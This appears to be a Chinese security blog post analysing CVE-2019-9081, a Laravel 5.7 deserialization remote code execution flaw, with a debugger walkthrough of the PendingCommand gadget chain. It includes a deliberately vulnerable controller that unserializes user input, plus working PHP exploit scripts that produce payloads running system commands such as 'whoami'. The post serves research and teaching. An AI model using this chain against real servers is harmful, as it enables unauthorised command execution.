# CVE-2019-9081 Laravel反序列化浅析

阅读量 **213136**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-21 14:30:05

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0183403c7a04557994.jpg)

## 一、原理

###  （一）概述

Laravel是一个具有表现力强、语法优雅的web应用程序框架。按照框架作者的理念，开发必须是一种愉快和创造性的经历。因此，Laravel试图通过简化大多数web项目中使用的常见任务来使开发变得容易。

###  （二）CVE-2019-9081

相较于v5.6，laravel
v5.7版本中多了一个`PendingCommand.php`文件。[官方文档](https://laravel.com/api/8.x/Illuminate/Testing/PendingCommand.html)对于这个文件的class的大体讲解如下，

![](https://p2.ssl.qhimg.com/t0111a45c27b0a3e498.png)

借用大佬的一句话，`__destruct()`方法是触发反序列化漏洞的最好方法。

查看`__destruct()`方法，其中调用了`run()`，

![](https://p2.ssl.qhimg.com/t0148bc62bccf694265.png)

run的介绍如下，

![](https://p1.ssl.qhimg.com/t019c5492d21eedc141.png)

即执行命令，这是一个可能的可利用点，还要对其进行观察分析，才能确认其是否真正可以利用。

我自己调试分析的过程记录在下，如有不足之处希望各位不吝赐教。

## 二、调试

###  （一）环境搭建

**1.基础环境**

[搭建参考链接](https://laravelacademy.org/post/9528.html)

首先，从PHPStudy上安装composer，

如有需要可配置国内镜像源，

    
    
    composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
    

然后通过 Composer 安装 Laravel 安装器：

    
    
    composer global require "laravel/installer"
    

安装指定版本的Laravel应用，比如5.7版本，可以使用这个命令：

    
    
    composer create-project --prefer-dist laravel/laravel blog 5.7.*
    

如此会在当前目录创建一个名为blob的新应用，将Phpstudy中的网站根目录设为blob/public，访问localhost，

见到此页面，

![](https://p5.ssl.qhimg.com/t019d21123b573a8941.png)

即说明搭建成功。

若在此过程中遇到`Fatal error: Allowed memory size of 1610612736 bytes exhausted (tried
to allocate 4096
bytes)`的错误，可参考[此链接](https://blog.csdn.net/wjcms/article/details/108932182)。

**2.情境设定**

情境设定如下：存在某一基于此框架的不安全的开发点`VulController`。

配置过程如下，在`routes/web.php`中添加一条路由记录，`Route::get('/vul',
'VulController[@index](https://github.com/index
"@index")');`，然后在`app/Http/Controllers`目录下新建文件`VulController.php`，源码如下:

    
    
    <?php
    namespace App\Http\Controllers;
    //VulController.php
    class VulController
    {
        public function index()
        {
    //        echo "666";
            unserialize($_GET['p']);
        }
    }
    

若是访问不了127.0.0.1/vul，则可能需要修改Apache的配置，使其允许路由，可参考[Ubuntu
Apache2开启mod_rewrite解决laravel路由失效问题](https://blog.csdn.net/wuhengde/article/details/49535343)

payload

    
    
    <?php
    //gadgets.php
    namespace Illuminate\Foundation\Testing{
        class PendingCommand{
            protected $command;
            protected $parameters;
            protected $app;
            public $test;
    
            public function __construct($command, $parameters,$class,$app)
            {
                $this->command = $command;
                $this->parameters = $parameters;
                $this->test=$class;
                $this->app=$app;
            }
        }
    }
    
    namespace Illuminate\Auth{
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes){
                $this->attributes = $attributes;
            }
        }
    }
    
    
    namespace Illuminate\Foundation{
        class Application{
            protected $hasBeenBootstrapped = false;
            protected $bindings;
    
            public function __construct($bind){
                $this->bindings=$bind;
            }
        }
    }
    ?>
    

exp

    
    
    <?php
    //chain.php
    include("gadgets.php");
    
    echo urlencode(serialize(new Illuminate\Foundation\Testing\PendingCommand("system",array('id'),new Illuminate\Auth\GenericUser(array("expectedOutput"=>array("0"=>"1"),"expectedQuestions"=>array("0"=>"1"))),new Illuminate\Foundation\Application(array("Illuminate\Contracts\Console\Kernel"=>array("concrete"=>"Illuminate\Foundation\Application"))))));
    ?>
    

exp

    
    
    <?php
    
    namespace Illuminate\Foundation\Testing{
        class PendingCommand{
            protected $command;
            protected $parameters;
            protected $app;
            public $test;
    
            public function __construct($command, $parameters,$class,$app){
                $this->command = $command;
                $this->parameters = $parameters;
                $this->test=$class;
                $this->app=$app;
            }
        }
    }
    
    namespace Illuminate\Auth{
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes){
                $this->attributes = $attributes;
            }
        }
    }
    
    namespace Illuminate\Foundation{
        class Application{
            protected $hasBeenBootstrapped = false;
            protected $bindings;
    
            public function __construct($bind){
                $this->bindings=$bind;
            }
        }
    }
    
    namespace{
        $genericuser = new Illuminate\Auth\GenericUser(array("expectedOutput"=>array("0"=>"1"),"expectedQuestions"=>array("0"=>"1")));
        $application = new Illuminate\Foundation\Application(array("Illuminate\Contracts\Console\Kernel"=>array("concrete"=>"Illuminate\Foundation\Application")));
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand("system",array('whoami'),$genericuser,$application);
        echo urlencode(serialize($pendingcommand));
    }
    

**3.其它**

遇到了PHPStorm+xdebug调试时过几分钟就会断开的错误，这时会出现Internal Server Error错误，

![](https://p1.ssl.qhimg.com/t015cf94d9cd9f62548.png)

搜索关键词 xdebug
超时，可得[PHPStorm+xdebug超时参考链接1](https://blog.csdn.net/xkdlzy/article/details/110880645)与[PHPStorm+xdebug超时参考链接2](https://my.oschina.net/lylyg/blog/4315320)，

可以通过修改配置文件解决，

在php.ini中的xdebug相关设置中，设置

    
    
    xdebug.remote_cookie_expire_time = 3600
    max_execution_time=3600
    max_input_time=3600
    default_socket_timeout = 3600
    

在apache配置文件httpd.conf中，额外设置

    
    
    Timeout 3600FcgidIOTimeout 3600FcgidIdleTimeout 3600IPCConnectTimeout 3600IPCCommTimeout 3600
    

不出意外，配置之后即可愉快调试。

###  （二）复现

运行exp，可得可使用的payload，

![](https://p1.ssl.qhimg.com/t013ef48014d9dbafa3.png)

携带payload访问vul，

![](https://p2.ssl.qhimg.com/t0183c418bf65261956.png)

已执行whoami命令，可见成功复现。

###  （三）调试

调用栈的主要部分，

    
    
    BoundMethod.php:113, Illuminate\Container\BoundMethod::getMethodDependencies()BoundMethod.php:29, Illuminate\Container\BoundMethod::Illuminate\Container\{closure:E:\phpstudy_pro\WWW\blog\vendor\laravel\framework\src\Illuminate\Container\BoundMethod.php:27-31}()BoundMethod.php:75, Illuminate\Container\BoundMethod::callBoundMethod()BoundMethod.php:31, Illuminate\Container\BoundMethod::call()Container.php:572, Illuminate\Foundation\Application->call()PendingCommand.php:136, Illuminate\Foundation\Testing\PendingCommand->run()PendingCommand.php:220, Illuminate\Foundation\Testing\PendingCommand->__destruct()...index.php:55, {main}()
    

下面分两段进行调试分析。

**1.类的加载至__destruct()方法**

序列化是将内存中的对象转换为外存中的字节序列的过程，保证对象在传递和保存对象时的完整性和可传递性；反序列化是将字节序列成目标对象的过程。既然反序列化要将字节流还原成对象，那么在反序列化执行的服务端，就应该完成对这些类的加载，才能顺利完成后面的工作。

我们发送payload，先令程序断在unserialize处，

![](https://p5.ssl.qhimg.com/t01b90a88fb995ee58e.png)

强制步入，此时调试过程会直接进入AliasLoader->load()，

![](https://p3.ssl.qhimg.com/t015acc2176cfced375.png)

中间的unserialize()和spl_autoload_call()这里无法进入，但我们可以通过查阅资料了解它们详细的内部功能。

unserialize()不展开讲，主要是spl_autoload_call()，

![](https://p1.ssl.qhimg.com/t0147f414f859a57eb8.png)

其功能是去注册的目录找与 classname 同名的 .php/.inc 文件，

在AliasLoader->load()中，我们可以看到，先

![](https://p4.ssl.qhimg.com/t01101e335757a9e70b.png)

![](https://p5.ssl.qhimg.com/t01b1fa2ff4ffdbb165.png)

此处先检查要加载的$alias中是否有static::$facadeNameSpace，如果有，则调用loadFacade，如果没有，则进入下面的流程。

可以看到，这里首先加载的是PendingCommand对象，对于它来说，其名字里不含有Facade，故而进入下面的流程，判断$this->aliases中是否有$alias，

![](https://p5.ssl.qhimg.com/t0137d2cddaa001be50.png)

此时我们可以看到，这里也是false的。

![](https://p4.ssl.qhimg.com/t014d8e1ee28e26098f.png)

![](https://p4.ssl.qhimg.com/t0141f1a4877f3af9a9.png)

接下来调用loadClass来加载PendingCommand，

![](https://p0.ssl.qhimg.com/t0138b71707ed31b7e1.png)

可以看到，此处根据路径相对关系对Illuminate/Foundation/Testing/PendingCommand进行了加载，最终通过下面的includeFile进行了include，

![](https://p2.ssl.qhimg.com/t01d1c11d7b7040e63b.png)

继续向下运行，就会完成PendingCommand的加载过程，

![](https://p1.ssl.qhimg.com/t01d2287e2ad83f13f3.png)

接下来加载GenericUser，大体过程与上面类似，不再赘述。

![](https://p5.ssl.qhimg.com/t01ec522f8c9d1669b9.png)

当payload中的类都加载完毕后，就会进入类的__destruct()，

![](https://p5.ssl.qhimg.com/t01dbcf3d3a4f7ae1ec.png)

![](https://p4.ssl.qhimg.com/t0110f8ab57c187fe34.png)

此时，hasExecuted天然为false，

![](https://p2.ssl.qhimg.com/t013c545f85e3d3d895.png)

将会顺利进入run()。

**2.run()方法内部**

**1.执行命令前**

我们跟进run()，

![](https://p3.ssl.qhimg.com/t0150002894736e8d5a.png)

call($this->command,
$this->parameters)处疑似run()内的命令执行点，在到达call()之前还有一个$this->mockConsoleOutput()方法，要想达到疑似的命令执行点，需要顺利走过mockConsoleOutput()，根据注释，改函数的功能是”Mock
the application’s console output.”，就是模仿应用的控制台输出，

![](https://p3.ssl.qhimg.com/t012279871a58a9027d.png)

这里想说点题外话了。

和之前在其它文章中说过的有一定的相似之处：在研究反序列化漏洞的过程中，当我们发现一个可能可以利用漏洞点之后，所有要做的事有二：一是构造一个可触发漏洞的payload，二是保证此payload可用顺利到达触发点。

payload到达触发点的过程（或曰不断靠近触发点的过程），在Java的反序列化漏洞的调试过程中会遇到一些和主题关联不大的函数（如[此篇文章](https://www.anquanke.com/post/id/235233)的LockVersionExtractor.extract()函数），若这些函数执行成功，不会对结果产生积极影响，但如果不能成功走过这些函数，则整个执行过程会被打断，就无法达到触发点。

对于这类函数，我们的思路就是保障它们顺利进行，不至于打断整个执行流程就可以了，其具体作用不是重点考虑的对象。举个不恰当的例子，高中时崇拜的数学老师曾经说过：很多中档级别的大题，你做对了，是没有用的，因为人人都会，但是你做错了，一定是不好的，因为会被别人拉开。

mockConsoleOutput的功能是模拟控制台输出，顺利运行了这个函数似乎对命令执行没有影响，但是若是在这个函数里出了什么错误，则一定不能达到命令执行的点（尽管现在还是疑似点）。

比如将exp简单更改，

![](https://p5.ssl.qhimg.com/t01e3053441787fc190.png)

若如此，则在如下这行会进入createABufferedOutputMock()函数，

![](https://p4.ssl.qhimg.com/t01e3a298ef0c45ccb7.png)

跟进之，

![](https://p2.ssl.qhimg.com/t0186779bb552c0a7bf.png)

此时的$this如下，

![](https://p1.ssl.qhimg.com/t0103429a2879a07c7d.png)

故而$this->test->expectedOutput是不存在的，

![](https://p0.ssl.qhimg.com/t010771a963caa352cd.png)

再向下运行就会抛出异常，

![](https://p0.ssl.qhimg.com/t01b5efddf0c78ad807.png)

![](https://p5.ssl.qhimg.com/t01c6799904206b0455.png)

![](https://p5.ssl.qhimg.com/t0128f911b08fff9f7a.png)

这样的话就没法到可能的执行命令点了，整个流程就被打断了。解决的思路就是参加foreach循环的这个$this->test->expectedOutput应该存在，且是个数组，与之类似的还有$this->test->expectedQuestions。

具体来讲，$this->test中应该有个expectedOutput，正常情况下，应该控制$this->test为一个对象，这个对象有expectedOutput属性。

![](https://p1.ssl.qhimg.com/t0126625219fbdb6568.png)

查看之后，可以看出，按照Laravel本身的设计，$this->test应该是一个Test类，经过学习网络上的资料，Test类一般不会被加载。这样的话，不好找一个天然的有expectedOutput的类。

此处可以用到PHP魔术方法中在ctf题中可能遇到的一个技巧，当访问一个类中不存在的属性时会触发`__get()`方法，通过去触发`__get()`方法去进一步构造pop链。

接下来需要找一个合适的`__get()`，比如下面这个就不一定合适，

![](https://p5.ssl.qhimg.com/t01156924306d1ba52c.png)

下面这个GenericUser就比较合适，

![](https://p0.ssl.qhimg.com/t01fd7909ced27679d1.png)

它的attributes属性是可控的，当运行到foreach($this->test->expectedOutput)时，返回控制好的GenericUser->attributes[‘expectedOutput’]数组即可，不至于出错，于是有了exp中如下的代码。

    
    
    class GenericUser{    protected $attributes;    public function __construct(array $attributes){        $this->attributes = $attributes;    }}$genericuser = new Illuminate\Auth\GenericUser(array("expecstedOutput"=>array("0"=>"1"),"expectedQuestions"=>array("0"=>"1")));
    

如此，则运行到如下这一步时，

![](https://p3.ssl.qhimg.com/t01b9b2ab4939f8af5d.png)

将触发GenericUser的`__get()`，

![](https://p0.ssl.qhimg.com/t01a07a17c674f787a2.png)

接下来可顺利走出createABufferedOutputMock()，

![](https://p5.ssl.qhimg.com/t013d7e4d35c1579c4a.png)

回到mockConsoleOutput()，

![](https://p0.ssl.qhimg.com/t016f4a8124a13589fc.png)

如法炮制即可顺利走过接下来的$this->test->expectedQuestions。

**2.执行命令中**

经历了mockConsoleOutput()，最终顺利走回run()，到达可能的命令执行点。

![](https://p0.ssl.qhimg.com/t01778355789ed0c1da.png)

此处的Kernel::class为定值，

![](https://p0.ssl.qhimg.com/t01fdd177df261e35f6.png)

步入，查看情况，先是获取key，然后试图make之，

![](https://p2.ssl.qhimg.com/t01e4cab9f7181e3896.png)

跟进，此时试图make一个抽象类，名字就是Kernel，

![](https://p3.ssl.qhimg.com/t01900276714a11ee9e.png)

继续跟进，进入了Container的make，其内部又调用了resolve，

![](https://p3.ssl.qhimg.com/t01fc2c3711b66dfd7f.png)

跟进之，这里试图获得Kernel的非抽象的类，

![](https://p1.ssl.qhimg.com/t0167ef32cea5f7f1bb.png)

跟进，可以看到，Kernel这里是没有非抽象的类的，所以不从第一个if中return，

![](https://p0.ssl.qhimg.com/t01711a7d5007c2301e.png)

步出getConcrete，继续向下，有一处判断，

![](https://p4.ssl.qhimg.com/t0104573718490502db.png)

![](https://p1.ssl.qhimg.com/t017f68b00eb86d396a.png)

可见，返回值为Application，

接下来走到此处，

![](https://p4.ssl.qhimg.com/t01d91081e9957af91d.png)

进入，此时$concrete为Application，$abstract为Kernel，且$concrete非Closure的实例，

![](https://p1.ssl.qhimg.com/t014f68bac52e9e9314.png)

所以这里是not buildable，将会进入else，

![](https://p3.ssl.qhimg.com/t01d776cc2d781f3016.png)

此处会进行make($concrete)，

步入，关键点是parent::make($abstract, $parameters);

![](https://p4.ssl.qhimg.com/t017f3d00ceb3117bd5.png)

Application继承了Container，

![](https://p0.ssl.qhimg.com/t01815aaf64cae15a2a.png)

再度进入Container的make。

对比上次进入Container::make时，$abstract的值为Kernel，现在已经是Application了，

![](https://p5.ssl.qhimg.com/t01a7cf09ec58ba3447.png)

经过此番运转，情况已经发生了转变，继续向下遇到isBuildable时，情况和之前就不一样了，

![](https://p5.ssl.qhimg.com/t0131d7f98d731973f3.png)

此时$abstract和$concrete都为Application，故而是Buildable，

![](https://p3.ssl.qhimg.com/t01b71a5211631b4b82.png)

继续走，步出几层，就可进入Container::call，

![](https://p5.ssl.qhimg.com/t01f1c0e49b3d36a8e9.png)

这里看起来已经很接近最后执行命令的点了，但是还不够彻底，继续跟进，

![](https://p3.ssl.qhimg.com/t01ece017465ebb5644.png)

先进入isCallableWithAtSign，里面判断$callback中是否有@，

![](https://p2.ssl.qhimg.com/t015adbe32e95692f85.png)

显然没有，再加上$defaultMethod为null，所以会向下走，

![](https://p5.ssl.qhimg.com/t01ac16d2c493e857c2.png)

$callback的参数是通过gerMethodDependency获得的，跟进之，

![](https://p2.ssl.qhimg.com/t0105d394f6e456d075.png)

addDependencyForCallParameter会给$callback添加参数，

![](https://p5.ssl.qhimg.com/t017590270d11a534c5.png)

函数的最后将我们传入的$parameters数字和$dependencies数组（为空）合并之后return，最后在BoundMethod对象的call()中我们相当于执行了call_user_func_array(‘system’,array(‘whoami’))

执行效果如下。

![](https://p1.ssl.qhimg.com/t015df5ad0d1776bd63.png)

## 三、收获与启示

Java和PHP的反序列化漏洞有明显不同，但也有较大的共同之处。不同点大可能是在Java中间件要找到的仅仅是一个readObject，在对象的反序列化过程中触发RCE；PHP中的对象的unserialize可能明显给出，需要找到call_user_func_array等执行命令的点。相同点大概是构造一个可触发漏洞的payload，并保证此payload可用顺利到达触发点。

## 参考链接

<https://www.cnblogs.com/tr1ple/p/11079354.html>

<https://skysec.top/2019/07/22/CVE-2019-9081-Laravel-Deserialization-RCE-Vulnerability/#%E6%80%BB%E7%BB%93>

<https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/>

<https://www.cnblogs.com/20175211lyz/p/12343980.html>

<https://xz.aliyun.com/t/5510>

<https://learnku.com/articles/4681/analysis-of-the-principle-of-php-automatic-loading-function>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **northind** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/244148](/post/id/244148)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [PHP](/tag/PHP)
  * [反序列化](/tag/反序列化)
  * [Laravel](/tag/Laravel)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhimg.com/t01f28ccab3282fc24b.png) northind

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

